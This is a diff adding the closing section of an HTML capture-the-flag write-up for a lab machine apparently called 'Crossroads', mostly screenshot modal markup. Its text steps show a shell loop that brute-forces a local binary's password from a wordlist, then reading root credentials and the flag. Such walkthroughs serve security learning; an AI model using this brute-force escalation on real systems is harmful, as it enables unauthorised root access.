+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/19.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal15" tabindex="-1" role="dialog" aria-labelledby="portfolioModal15Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/19.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    It will take time. Once completed it will create a folder called results   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal16">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/20.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal16" tabindex="-1" role="dialog" aria-labelledby="portfolioModal16Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/20.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Lets cd into results and go to the keepers folder  
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal17">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/21.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal17" tabindex="-1" role="dialog" aria-labelledby="portfolioModal17Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/21.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                                <!-- Portfolio Item 1-->
+                                                    <div class="col-md-6 col-lg-4">
+                                                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal55">
+                                                           
+                                                            <img class="img-fluid" src="assets/img/crossroads/22.png" alt="" />
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="portfolio-modal modal fade" id="portfolioModal55" tabindex="-1" role="dialog" aria-labelledby="portfolioModal55Label" aria-hidden="true">
+                                                    <div class="modal-dialog modal-xl" role="document">
+                                                        <div class="modal-content">
+                                                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                            </button>
+                                                            <div class="modal-body text-center">
+                                                                <div class="container">
+                                                                    <div class="row justify-content-center">
+                                                                        <div class="col-lg-8">
+                                                                            
+                                                                            <!-- Portfolio Modal - Image-->
+                                                                            <img class="img-fluid rounded mb-5" src="assets/img/crossroads/22.png" alt="" />
+                                                                            
+                                                                           
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We can see multiple files here. If we try to open the first file, we can see a wordlist<br>
+                                                    Lets save this file as wordlist.txt  
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal56">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/23.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal56" tabindex="-1" role="dialog" aria-labelledby="portfolioModal56Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/23.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Send the file using python http server to the victim<br>
+                                                    We need to bruteforce the password. I have used the below script
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        for i in $(cat wordlist.txt); do echo $i | ./beroot; done      
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal57">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/24.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal57" tabindex="-1" role="dialog" aria-labelledby="portfolioModal57Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/24.png" alt="" />
+                                                                        
+                                                                      
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    It will keep bruteforcing the password and once completed use ls<br>
+                                                    You will see a file called rootcreds      
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal58">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/25.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal58" tabindex="-1" role="dialog" aria-labelledby="portfolioModal58Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/25.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        cat rootcreds
+                                                      
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal59">
+                                                       
+                                                        <img class="img-fluid" src="assets/img/crossroads/26.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal59" tabindex="-1" role="dialog" aria-labelledby="portfolioModal59Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/26.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    And you got your root password!<br>
+                                                    Lets login with root and password as ___drifting___ using su<br>
+                                                    Post login go to the root folder you will get the root flag!
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        cat root.txt 
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal60">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/27.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal60" tabindex="-1" role="dialog" aria-labelledby="portfolioModal60Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/27.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            
+
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Thanks for reading! :)   
+                                                    </p>                      
+                                                </div>
+                                            </div>    
+
+
+            </div>
+        </section>
+
+
+        <!-- Copyright Section-->
+        <div class="copyright py-4 text-center text-white">
+            <div class="container"><small>Copyright © NikitPenkar 2021</small></div>
+        </div>
+        <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes)-->
+        <div class="scroll-to-top d-lg-none position-fixed">
+            <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top"><i class="fa fa-chevron-up"></i></a>
+        </div>
+
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Contact form JS-->
+        <script src="assets/mail/jqBootstrapValidation.js"></script>
+        <script src="assets/mail/contact_me.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
